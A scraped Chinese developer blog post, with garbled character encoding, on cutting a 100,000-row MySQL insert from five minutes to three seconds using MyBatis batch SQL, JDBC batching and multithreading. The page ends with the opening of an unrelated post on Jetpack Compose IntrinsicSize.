pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šå‘¨æ¥äº†ä¸ªæ•°æ®è¿ç§»çš„æ´»ï¼Œè¦æŠŠ10ä¸‡æ¡æ•°æ®ä»è€ç³»ç»Ÿå¯¼å…¥æ–°ç³»ç»Ÿã€‚</p>
<p>å†™äº†ä¸ªç®€å•çš„æ‰¹é‡æ’å…¥ï¼Œè·‘èµ·æ¥ä¸€çœ‹â€”â€”5åˆ†é’Ÿã€‚</p>
<p>é¢†å¯¼è¯´å¤ªæ…¢äº†ï¼Œèƒ½ä¸èƒ½å¿«ç‚¹ï¼Ÿ</p>
<p>æŠ˜è…¾äº†ä¸€ä¸‹åˆï¼Œæœ€åä¼˜åŒ–åˆ°3ç§’ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-0"><strong>æœ€åˆçš„ä»£ç ï¼ˆ5åˆ†é’Ÿï¼‰</strong></h3>
<p>æœ€å¼€å§‹å†™çš„å¾ˆç®€å•ï¼Œforeachå¾ªç¯æ’å…¥ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æ–¹å¼1ï¼šå¾ªç¯å•æ¡æ’å…¥ï¼ˆæœ€æ…¢ï¼‰</span>
forÂ (User user : userList) {
Â  Â  userMapper<span class="hljs-selector-class">.insert</span>(user);
}
</code></pre>
<p>10ä¸‡æ¡æ•°æ®ï¼Œæ¯æ¡éƒ½è¦èµ°ä¸€æ¬¡ç½‘ç»œè¯·æ±‚ã€ä¸€æ¬¡SQLè§£æã€ä¸€æ¬¡äº‹åŠ¡æäº¤ã€‚</p>
<p>ç®—ä¸€ä¸‹ï¼šå‡è®¾æ¯æ¡æ’å…¥éœ€è¦3msï¼Œ10ä¸‡æ¡å°±æ˜¯300ç§’ = 5åˆ†é’Ÿã€‚</p>
<p><strong>è¿™æ˜¯æœ€è ¢çš„å†™æ³•ï¼Œä½†æˆ‘è§è¿‡å¾ˆå¤šé¡¹ç›®éƒ½è¿™ä¹ˆå†™ã€‚</strong></p>
<h3 data-id="heading-1"><strong>ç¬¬ä¸€æ¬¡ä¼˜åŒ–ï¼šæ‰¹é‡SQLï¼ˆ30ç§’ï¼‰</strong></h3>
<p>æŠŠå¾ªç¯æ’å…¥æ”¹æˆæ‰¹é‡SQLï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;!-- Mapper.xml --&gt;
&lt;insert <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span>&gt;
Â  Â  INSERT INTO user (name, age, email) VALUES
Â  Â  &lt;foreach <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span>Â item=<span class="hljs-string">"item"</span>Â separator=<span class="hljs-string">","</span>&gt;
Â  Â  Â  Â  (<span class="hljs-comment">#{item.name}, #{item.age}, #{item.email})</span>
Â  Â  &lt;/foreach&gt;
&lt;/insert&gt;
// åˆ†æ‰¹æ’å…¥ï¼Œæ¯æ‰¹1000æ¡
int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i += batchSize) {</span>
Â  Â  int <span class="hljs-attr">end</span> = Math.min(i + batchSize, userList.size())<span class="hljs-comment">;</span>
Â  Â  List&lt;User&gt; <span class="hljs-attr">batch</span> = userList.subList(i, end)<span class="hljs-comment">;</span>
Â  Â  userMapper.batchInsert(batch)<span class="hljs-comment">;</span>
}
</code></pre>
<p>ä»5åˆ†é’Ÿé™åˆ°30ç§’ï¼Œæå‡10å€ã€‚</p>
<blockquote>
<p>â€œ</p>
<p>åŸç†ï¼šä¸€æ¡SQLæ’å…¥å¤šæ¡æ•°æ®ï¼Œå‡å°‘ç½‘ç»œå¾€è¿”æ¬¡æ•°ã€‚</p>
</blockquote>
<p>ä½†è¿˜æœ‰é—®é¢˜ï¼š30ç§’è¿˜æ˜¯å¤ªæ…¢ã€‚</p>
<h3 data-id="heading-2"><strong>ç¬¬äºŒæ¬¡ä¼˜åŒ–ï¼šJDBCæ‰¹å¤„ç†ï¼ˆ8ç§’ï¼‰</strong></h3>
<p>MySQLæœ‰ä¸ªå‚æ•°å«<code>rewriteBatchedStatements</code>ï¼Œå¼€å¯åå¯ä»¥æŠŠå¤šæ¡INSERTåˆå¹¶æˆä¸€æ¡ã€‚</p>
<h5 data-id="heading-3"><strong>ç¬¬ä¸€æ­¥ï¼šä¿®æ”¹æ•°æ®åº“è¿æ¥URL</strong></h5>
<pre><code class="hljs language-bash" lang="bash">jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=<span class="hljs-literal">true</span>
</code></pre>
<h5 data-id="heading-4"><strong>ç¬¬äºŒæ­¥ï¼šä½¿ç”¨MyBatisçš„æ‰¹å¤„ç†æ¨¡å¼</strong></h5>
<pre><code class="hljs language-ini" lang="ini">@Autowired
private SqlSessionFactory sqlSessionFactory<span class="hljs-comment">;</span>

public void batchInsertWithExecutor(List&lt;User&gt; userList) {
Â  Â  try (SqlSession <span class="hljs-attr">sqlSession</span> = sqlSessionFactory.openSession(ExecutorType.BATCH)) {
Â  Â  Â  Â  UserMapper <span class="hljs-attr">mapper</span> = sqlSession.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â  int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
Â  Â  Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i++) {</span>
Â  Â  Â  Â  Â  Â  mapper.insert(userList.get(i))<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â Â ifÂ ((i + 1) % <span class="hljs-attr">batchSize</span> == <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.clearCache()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  sqlSession.commit()<span class="hljs-comment">;</span>
Â  Â  }
}
</code></pre>
<p>ä»30ç§’é™åˆ°8ç§’ã€‚</p>
<blockquote>
<p>â€œ</p>
<p>åŸç†ï¼š<code>ExecutorType.BATCH</code>æ¨¡å¼ä¸‹ï¼ŒMyBatisä¼šç¼“å­˜SQLï¼Œæœ€åä¸€æ¬¡æ€§å‘é€ç»™æ•°æ®åº“æ‰§è¡Œã€‚é…åˆ<code>rewriteBatchedStatements=true</code>ï¼ŒMySQLé©±åŠ¨ä¼šæŠŠå¤šæ¡INSERTåˆå¹¶ã€‚</p>
</blockquote>
<h3 data-id="heading-5"><strong>ç¬¬ä¸‰æ¬¡ä¼˜åŒ–ï¼šå¤šçº¿ç¨‹å¹¶è¡Œï¼ˆ3ç§’ï¼‰</strong></h3>
<p>8ç§’è¿˜æ˜¯ä¸å¤Ÿå¿«ï¼Œä¸Šå¤šçº¿ç¨‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">public void parallelBatchInsert(List&lt;User&gt; userList) {
Â  Â  int <span class="hljs-attr">threadCount</span> = <span class="hljs-number">4</span><span class="hljs-comment">; Â // æ ¹æ®æ•°æ®åº“è¿æ¥æ± å¤§å°è°ƒæ•´</span>
Â  Â  int <span class="hljs-attr">batchSize</span> = userList.size() / threadCount<span class="hljs-comment">;</span>
Â  Â Â 
Â  Â  ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(threadCount)<span class="hljs-comment">;</span>
Â  Â  List&lt;Future&lt;?&gt;&gt; <span class="hljs-attr">futures</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
Â  Â Â 
Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++) {</span>
Â  Â  Â  Â  int <span class="hljs-attr">start</span> = i * batchSize<span class="hljs-comment">;</span>
Â  Â  Â  Â  int <span class="hljs-attr">end</span> = (i == threadCount - <span class="hljs-number">1</span>) ? userList.size() : (i + <span class="hljs-number">1</span>) * batchSize<span class="hljs-comment">;</span>
Â  Â  Â  Â  List&lt;User&gt; <span class="hljs-attr">subList</span> = userList.subList(start, end)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â  futures.add(executor.submit(() -&gt; {
Â  Â  Â  Â  Â  Â  batchInsertWithExecutor(subList)<span class="hljs-comment">;</span>
Â  Â  Â  Â  }))<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â 
Â  Â  // ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ
Â  Â Â forÂ (Future&lt;?&gt; future : futures) {
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  future.get()<span class="hljs-comment">;</span>
Â  Â  Â  Â  } catch (Exception e) {
Â  Â  Â  Â  Â  Â  thrownew RuntimeException(e)<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  }
Â  Â Â 
Â  Â  executor.shutdown()<span class="hljs-comment">;</span>
}
</code></pre>
<p>ä»8ç§’é™åˆ°3ç§’ã€‚</p>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>çº¿ç¨‹æ•°ä¸è¦è¶…è¿‡æ•°æ®åº“è¿æ¥æ± å¤§å°</li>
<li>å¦‚æœéœ€è¦äº‹åŠ¡ä¸€è‡´æ€§ï¼Œè¿™ä¸ªæ–¹æ¡ˆä¸é€‚ç”¨</li>
<li>è¦è€ƒè™‘ä¸»é”®å†²çªçš„é—®é¢˜</li>
</ul>
<h3 data-id="heading-6"><strong>ä¼˜åŒ–æ•ˆæœå¯¹æ¯”</strong></h3>






























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>è€—æ—¶</th><th>æå‡å€æ•°</th></tr></thead><tbody><tr><td>å¾ªç¯å•æ¡æ’å…¥</td><td>300ç§’</td><td>åŸºå‡†</td></tr><tr><td>æ‰¹é‡SQL</td><td>30ç§’</td><td>10å€</td></tr><tr><td>JDBCæ‰¹å¤„ç†</td><td>8ç§’</td><td>37å€</td></tr><tr><td>å¤šçº¿ç¨‹å¹¶è¡Œ</td><td>3ç§’</td><td>100å€</td></tr></tbody></table>
<h3 data-id="heading-7"><strong>è¸©è¿‡çš„å‘</strong></h3>
<h5 data-id="heading-8"><strong>å‘1ï¼šforeachæ‹¼æ¥SQLè¿‡é•¿</strong></h5>
<pre><code class="hljs language-ini" lang="ini">&lt;foreach <span class="hljs-attr">collection</span>=<span class="hljs-string">"list"</span>Â item=<span class="hljs-string">"item"</span>Â separator=<span class="hljs-string">","</span>&gt;
</code></pre>
<p>å¦‚æœä¸€æ¬¡æ’å…¥å¤ªå¤šæ¡ï¼ŒSQLä¼šéå¸¸é•¿ï¼Œå¯èƒ½è¶…è¿‡<code>max_allowed_packet</code>é™åˆ¶ã€‚</p>
<p><strong>è§£å†³ï¼š</strong> Â åˆ†æ‰¹æ’å…¥ï¼Œæ¯æ‰¹500-1000æ¡ã€‚</p>
<h5 data-id="heading-9"><strong>å‘2ï¼šrewriteBatchedStatementsä¸ç”Ÿæ•ˆ</strong></h5>
<p>æ£€æŸ¥å‡ ä¸ªç‚¹ï¼š</p>
<ul>
<li>URLå‚æ•°æ˜¯å¦æ­£ç¡®ï¼š<code>rewriteBatchedStatements=true</code></li>
<li>æ˜¯å¦ä½¿ç”¨äº†<code>ExecutorType.BATCH</code></li>
<li>MySQLé©±åŠ¨ç‰ˆæœ¬æ˜¯å¦å¤ªæ—§</li>
</ul>
<h5 data-id="heading-10"><strong>å‘3ï¼šè‡ªå¢ä¸»é”®è¿”å›é—®é¢˜</strong></h5>
<p>æ‰¹é‡æ’å…¥æ—¶æƒ³è·å–è‡ªå¢ä¸»é”®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;insert <span class="hljs-attr">id</span>=<span class="hljs-string">"batchInsert"</span>Â useGeneratedKeys=<span class="hljs-string">"true"</span>Â keyProperty=<span class="hljs-string">"id"</span>&gt;
</code></pre>
<p>æ³¨æ„ï¼š<code>rewriteBatchedStatements=true</code>æ—¶ï¼Œè‡ªå¢ä¸»é”®è¿”å›å¯èƒ½æœ‰é—®é¢˜ï¼Œéœ€è¦å‡çº§MySQLé©±åŠ¨åˆ°8.0.17+ã€‚</p>
<h5 data-id="heading-11"><strong>å‘4ï¼šå†…å­˜æº¢å‡º</strong></h5>
<p>10ä¸‡æ¡æ•°æ®ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜ï¼Œå¯èƒ½OOMã€‚</p>
<p>è§£å†³ï¼šåˆ†é¡µè¯»å– + åˆ†æ‰¹æ’å…¥ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">int <span class="hljs-attr">pageSize</span> = <span class="hljs-number">10000</span><span class="hljs-comment">;</span>
int <span class="hljs-attr">total</span> = countTotal()<span class="hljs-comment">;</span>
forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; total; i += pageSize) {</span>
Â  Â  List&lt;User&gt; <span class="hljs-attr">page</span> = selectByPage(i, pageSize)<span class="hljs-comment">;</span>
Â  Â  batchInsertWithExecutor(page)<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-12"><strong>æœ€ç»ˆæ–¹æ¡ˆä»£ç </strong></h3>
<pre><code class="hljs language-ini" lang="ini">@Service
publicclass BatchInsertService {
Â  Â Â 
Â  Â  @Autowired
Â  Â  private SqlSessionFactory sqlSessionFactory<span class="hljs-comment">;</span>
Â  Â Â 
Â  Â  /**
Â  Â  Â * é«˜æ€§èƒ½æ‰¹é‡æ’å…¥
Â  Â  Â * 10ä¸‡æ¡æ•°æ®çº¦3ç§’
Â  Â  Â */
Â  Â  public void highPerformanceBatchInsert(List&lt;User&gt; userList) {
Â  Â  Â  Â Â ifÂ (<span class="hljs-attr">userList</span> == null || userList.isEmpty()) {
Â  Â  Â  Â  Â  Â Â return<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  int <span class="hljs-attr">threadCount</span> = Math.min(<span class="hljs-number">4</span>, Runtime.getRuntime().availableProcessors())<span class="hljs-comment">;</span>
Â  Â  Â  Â  int <span class="hljs-attr">batchSize</span> = (int) Math.ceil((double) userList.size() / threadCount)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â  ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(threadCount)<span class="hljs-comment">;</span>
Â  Â  Â  Â  CountDownLatch <span class="hljs-attr">latch</span> = new CountDownLatch(threadCount)<span class="hljs-comment">;</span>
Â  Â  Â  Â Â 
Â  Â  Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; threadCount; i++) {</span>
Â  Â  Â  Â  Â  Â  int <span class="hljs-attr">start</span> = i * batchSize<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  int <span class="hljs-attr">end</span> = Math.min((i + <span class="hljs-number">1</span>) * batchSize, userList.size())<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â Â ifÂ (start &gt;= userList.size()) {
Â  Â  Â  Â  Â  Â  Â  Â  latch.countDown()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â Â continue<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  List&lt;User&gt; <span class="hljs-attr">subList</span> = new ArrayList&lt;&gt;(userList.subList(start, end))<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  executor.submit(() -&gt; {
Â  Â  Â  Â  Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  doBatchInsert(subList)<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  } finally {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  latch.countDown()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  })<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  latch.await()<span class="hljs-comment">;</span>
Â  Â  Â  Â  } catch (InterruptedException e) {
Â  Â  Â  Â  Â  Â  Thread.currentThread().interrupt()<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  executor.shutdown()<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â 
Â  Â  private void doBatchInsert(List&lt;User&gt; userList) {
Â  Â  Â  Â  try (SqlSession <span class="hljs-attr">sqlSession</span> = sqlSessionFactory.openSession(ExecutorType.BATCH,Â <span class="hljs-literal">false</span>)) {
Â  Â  Â  Â  Â  Â  UserMapper <span class="hljs-attr">mapper</span> = sqlSession.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â Â forÂ (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; userList.size(); i++) {</span>
Â  Â  Â  Â  Â  Â  Â  Â  mapper.insert(userList.get(i))<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ ((i + 1) % <span class="hljs-attr">1000</span> == <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  sqlSession.clearCache()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  sqlSession.flushStatements()<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  sqlSession.commit()<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<h3 data-id="heading-13"><strong>æ€»ç»“</strong></h3>





















<table><thead><tr><th>ä¼˜åŒ–ç‚¹</th><th>å…³é”®é…ç½®</th></tr></thead><tbody><tr><td>æ‰¹é‡SQL</td><td>foreachæ‹¼æ¥ï¼Œåˆ†æ‰¹1000æ¡</td></tr><tr><td>JDBCæ‰¹å¤„ç†</td><td>rewriteBatchedStatements=true+ExecutorType.BATCH</td></tr><tr><td>å¤šçº¿ç¨‹</td><td>çº¿ç¨‹æ•° â‰¤ è¿æ¥æ± å¤§å°</td></tr></tbody></table>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼š</strong> Â å‡å°‘ç½‘ç»œå¾€è¿” + å‡å°‘äº‹åŠ¡æ¬¡æ•° + å¹¶è¡Œå¤„ç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7600787795478134830</link>    <guid>https://juejin.cn/post/7600787795478134830</guid>    <pubDate>2026-01-30T13:57:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478134830" data-draft-id="7600955777316077606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="Android,Android Jetpack,Kotlin"/> <meta itemprop="datePublished" content="2026-01-30T13:57:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨€æœ‰çŒ¿è¯‰"/> <meta itemprop="url" content="https://juejin.cn/user/2788017216685784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Composeä¸­çš„IntrinsicSizeå®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788017216685784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨€æœ‰çŒ¿è¯‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:57:33.000Z" title="Fri Jan 30 2026 13:57:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¯‘è‡ªã€ŒMastering IntrinsicSize in Jetpack Compose: A Real-World Guideã€ï¼ŒåŸæ–‡é“¾æ¥<a href="https://link.juejin.cn?target=https%3A%2F%2Fproandroiddev.com%2Fmastering-intrinsicsize-in-jetpack-compose-a-real-world-guide-a57ab90c6556" target="_blank" title="https://proandroiddev.com/mastering-intrinsicsize-in-jetpack-compose-a-real-world-guide-a57ab90c6556" ref="nofollow noopener noreferrer">proandroiddev.com/mastering-iâ€¦</a>ï¼Œç”±Sehaj kahlonå‘å¸ƒäº2026å¹´1æœˆ24æ—¥ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/686bd52c0b2a4b4cb6a463af988b9e3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=4unr45DRgBAjml%2FKu9%2FTYzR3Bgw%3D" alt="0.png" loading="lazy"/></p>
<p>å¦‚æœä½ ä¸€ç›´åœ¨ä½¿ç”¨ Jetpack Composeï¼Œä½ å¯èƒ½é‡åˆ°è¿‡å¸ƒå±€è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦çš„ä»¤äººæ²®ä¸§çš„æƒ…å†µã€‚ä¹Ÿè®¸æ˜¯ <code>Box</code> ä¸­çš„ <code>weight()</code> ä¿®é¥°ç¬¦å¯¼è‡´äº†å¥‡æ€ªçš„è¡Œä¸ºï¼Œæˆ–è€…ä½ çš„åˆ†å±‚ UI å…ƒç´ å¤§å°ä¸æ­£ç¡®ã€‚</p>
